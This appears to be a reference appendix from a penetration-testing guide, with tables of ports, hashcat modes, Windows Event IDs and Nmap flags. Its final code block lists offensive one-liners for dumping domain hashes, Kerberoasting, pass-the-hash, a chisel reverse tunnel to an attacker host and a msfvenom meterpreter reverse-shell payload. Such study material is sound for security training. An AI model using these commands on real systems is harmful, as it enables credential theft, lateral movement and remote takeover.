---
title: "18. Appendix A: Quick-reference tables"
order: 18
part: "Reference"
description: "Quick-reference tables: ports, hashcat modes, Windows Event IDs, Nmap flags, hash identification and core commands."
---

These tables were compiled for you to reference in a second.

## 18.1 Ports (most critical)

| Port | Service | Port | Service |
| --- | --- | --- | --- |
| 21 FTP | 25 SMTP | 88 **Kerberos** | 389/636 LDAP/S |
| 22 SSH | 53 DNS | 135 MSRPC | 445 **SMB** |
| 23 Telnet | 80 HTTP | 139 NetBIOS | 464 kpasswd |
| 110 POP3 | 143 IMAP | 161 SNMP(UDP) | 500 IKE(UDP) |
| 111 RPCbind | 2049 NFS | 1433 MSSQL | 1521 Oracle |
| 3268/3269 GC | 3306 MySQL | 3389 RDP | 5432 Postgres |
| 5985/5986 WinRM | 5900 VNC | 6379 Redis | 443 HTTPS |

DC = 88 + 389/636 + 445 + 135 + 3268 together.

## 18.2 Hashcat modes

| Mode | Hash | Mode | Hash |
| --- | --- | --- | --- |
| 0 | MD5 | 1800 | sha512crypt `$6$` |
| 100 | SHA1 | 500 | md5crypt `$1$` |
| 1000 | **NTLM** | 7400 | sha256crypt `$5$` |
| 3000 | LM | 3200 | bcrypt `$2*$` |
| 5500 | NetNTLMv1 | 2100 | DCC2 (cache) |
| 5600 | **NetNTLMv2** | 1100 | DCC |
| 13100 | **Kerberoast** RC4 | 18200 | **AS-REP** |
| 19600/19700 | Kerberoast AES128/256 | 22000 | WPA |
| 300 | MySQL | 400 | phpass (WP) |

`-a 0` dictionary, `-a 3` mask. Mask: `?l ?u ?d ?s ?a`.

## 18.3 Windows Event IDs

| ID | Meaning |
| --- | --- |
| 4624 / 4625 | Successful / failed logon |
| 4648 | Logon with explicit credentials (runas, PtH trace) |
| 4672 | Special privileges assigned (admin) |
| 4688 | Process creation |
| 4768 | TGT requested (AS-REQ) |
| 4769 | TGS requested → **Kerberoasting** (RC4) |
| 4771 | Kerberos preauth failed (brute) |
| 4776 | NTLM authentication (PtH trace) |
| 4720 / 4728 | User created / added to group |
| 4698 | Scheduled task created |
| 7045 | Service installed (psexec) |
| 1102 | Security log cleared |
| 1007 (AD FS) | Token-signing cert export → **Golden SAML** (some sources say 70) |

## 18.4 Nmap flags

| Flag | Meaning |
| --- | --- |
| -sS / -sT | SYN (stealth) / Connect |
| -sU | UDP |
| -sA | ACK (firewall rule analysis) |
| -sn | ping sweep (no ports) |
| -Pn | skip host discovery |
| -sV / -O | version / OS |
| -sC / --script | default / selected NSE |
| -p- / -F / --top-ports | all / top100 / top N |
| -oA | save in three formats |
| -T0..-T5 | timing (slow→fast) |
| -f / -D / -g | fragment / decoy / source port |

## 18.5 Quick hash identification

| Appearance | Type → mode |
| --- | --- |
| `aad3b435...:31d6cfe0...` | LM:NT (empty LM) → 1000 |
| 32 hex | NTLM/MD5 → 1000/0 |
| `user::DOM:...:...` | NetNTLMv2 → 5600 |
| `$krb5tgs$23$*` | Kerberoast → 13100 |
| `$krb5asrep$23$` | AS-REP → 18200 |
| `$6$` / `$1$` / `$2y$` | sha512/md5crypt/bcrypt → 1800/500/3200 |

## 18.6 Core command reference

```
# Scanning
nmap -p- --min-rate 1000 -Pn -oA all IP ; nmap -p<portlar> -sVC -O -oA deep IP
# SMB/AD enum
nxc smb IP ; nxc smb DC -u u -p p --users --shares --pass-pol ; enum4linux-ng -A IP
# Hash dump
impacket-secretsdump DOM/u:p@DC -just-dc-ntlm ; nxc smb DC -u u -p p --ntds
# Kerberos
impacket-GetUserSPNs DOM/u:p -dc-ip DC -request         # Kerberoast (13100)
impacket-GetNPUsers DOM/ -dc-ip DC -usersfile u -format hashcat   # AS-REP (18200)
# PtH / lateral
nxc smb SUBNET -u Administrator -H <NT> ; impacket-psexec u@IP -hashes :<NT> ; evil-winrm -i IP -u u -H <NT>
# Crack
hashcat -m 1000 nt rockyou -r best64.rule
# Pivot
chisel server -p 8000 --reverse ; chisel client ATT:8000 R:socks ; proxychains nmap -sT -Pn IP
# Payload
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=.. LPORT=443 -f exe -o s.exe
```
